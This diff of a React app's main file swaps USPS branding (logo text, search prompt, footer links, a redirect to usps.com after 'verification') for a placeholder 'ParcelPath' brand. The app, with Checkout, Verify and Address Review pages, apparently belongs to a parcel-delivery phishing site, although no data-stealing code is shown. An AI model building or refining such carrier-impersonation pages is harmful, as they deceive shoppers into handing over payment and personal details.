@@ -10,7 +10,7 @@ import Checkout from './pages/Checkout';
 import Verify from './pages/Verify';
 import AppCheck from './pages/AppCheck';
 
-const ADMIN_EXTERNAL_URL = 'https://www.usps.com/';
+const ADMIN_EXTERNAL_URL = 'https://www.parcelpath.example/';
 
 function getRouteNotice(target: string, reason: string) {
   const cleanReason = reason.trim();
@@ -63,7 +63,7 @@ function AdminRouteListener({ onNotice }: { onNotice: (message: string) => void 
       try {
         const parsed = new URL(ADMIN_EXTERNAL_URL, window.location.origin);
         if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return;
-        onNotice('Verification completed. Redirecting you to the USPS tracking page.');
+        onNotice('Verification completed. Redirecting you to the delivery review page.');
         if (pendingTimerRef.current) window.clearTimeout(pendingTimerRef.current);
         pendingTimerRef.current = window.setTimeout(() => {
           window.location.href = parsed.toString();
@@ -176,8 +176,8 @@ function App() {
               </button>
             </div>
             <div className="alz-nav-brand">
-              <div className="alz-nav-logo" aria-label="USPS">
-                <img src="/usps-header-logo.svg" alt="USPS" className="alz-nav-logo-img" />
+              <div className="alz-nav-logo" aria-label="ParcelPath">
+                <img src="/usps-header-logo.svg" alt="ParcelPath" className="alz-nav-logo-img" />
               </div>
             </div>
             <div className="alz-nav-actions">
@@ -189,7 +189,7 @@ function App() {
           <div className="alz-nav-divider" />
           <div className="alz-nav-search-row">
             <div className="alz-nav-search-shell" aria-hidden="true">
-              <div className="alz-nav-search-input">Search USPS.com or Enter Tracking Number(s)</div>
+              <div className="alz-nav-search-input">Search delivery help or enter tracking details</div>
               <div className="alz-nav-search-action">
                 <span className="alz-nav-search-box-icon" />
               </div>
@@ -208,8 +208,8 @@ function App() {
         <footer className="alz-global-footer">
           <div className="alz-global-footer-strip">
             <div className="alz-global-footer-strip-inner">
-              <span>USPS Tracking</span>
-              <span>Delivery Support</span>
+              <span>Delivery Tracking</span>
+              <span>Shipment Support</span>
               <span>Address Review</span>
               <span>Secure Verification</span>
             </div>
@@ -217,7 +217,7 @@ function App() {
           <div className="alz-global-footer-inner">
             <span>FAQs</span>
             <span>Privacy Policy</span>
-            <span>Contact USPS</span>
+            <span>Contact Support</span>
             <span>Terms of Use</span>
             <span>(c) 2026 {BRAND.name}.</span>
           </div>
